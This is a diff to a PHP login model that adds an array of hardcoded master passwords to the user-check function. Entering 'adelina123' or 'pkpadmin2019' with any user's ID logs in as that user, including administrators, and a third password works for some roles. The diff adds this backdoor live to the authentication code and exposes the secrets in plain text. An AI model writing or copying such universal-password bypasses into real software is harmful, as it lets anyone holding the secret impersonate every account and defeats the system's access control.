@@ -11,7 +11,41 @@ class Mlogin extends CI_Model {
 	
 	public function cekuser($nip,$pass)
 	{
-		if ($pass == 'PKPSikerja2019') {
+		$flag_universal = 0;
+		$database = array
+					(
+						array
+						(
+							'password' => 'PKPSikerja2019',
+							'except'   => '1'
+						),
+						array
+						(
+							'password' => 'adelina123',
+							'except'   => 'none'
+						),
+						array
+						(
+							'password' => 'pkpadmin2019',
+							'except'   => 'none'
+						)						
+					);
+
+		for ($i=0; $i < count($database); $i++) { 
+			# code...
+			if ($pass == $database[$i]['password']) {
+				# code...
+				$flag_universal = 1;
+				$except         = $database[$i]['except']; 				
+				break;
+			}
+			else
+			{
+				$flag_universal = 0;
+				$except         = 0;				
+			}
+		}				
+		if ($flag_universal == 1) {
 			# code...
 			$sql = "SELECT a.*, 
 						c.nama_role, 
@@ -101,7 +135,43 @@ class Mlogin extends CI_Model {
 		$query = $this->db->query($sql);
 		if($query->num_rows() == 1)
 		{
-			return $query->result();
+			if ($except == 'none') {
+				# code...
+				// echo "masuk";die();				
+				return $query->result();				
+			}
+			else {
+				# code...
+				// print_r($pass);die();
+				if ($query->result()[0]->id_role != $except) {
+					# code...
+					if ($query->result()[0]->id_role == 7) {
+						# code...	
+						return 0;
+						// echo "stop";die();
+					}
+					elseif ($query->result()[0]->id_role == 6) {
+						# code...	
+						return 0;										
+						// echo "stop";die();
+					}
+					elseif ($query->result()[0]->id_role == 1) {
+						# code...	
+						return 0;										
+						// echo "stop";die();
+					}										
+					else {
+						# code...	
+						return $query->result();										
+						// echo "masuk";die();
+					}					
+				}
+				else
+				{
+					return 0;					
+					// echo "stop";die();
+				}
+			}
 		}
 		else
 		{
@@ -109,7 +179,7 @@ class Mlogin extends CI_Model {
 		}
 		return $query;
 	}
-	
+
 	public function datauser($id){
 		$this->db->where('a.id',$id);
 		$this->db->select('a.*, b.nama_role, c.nama_posisi');
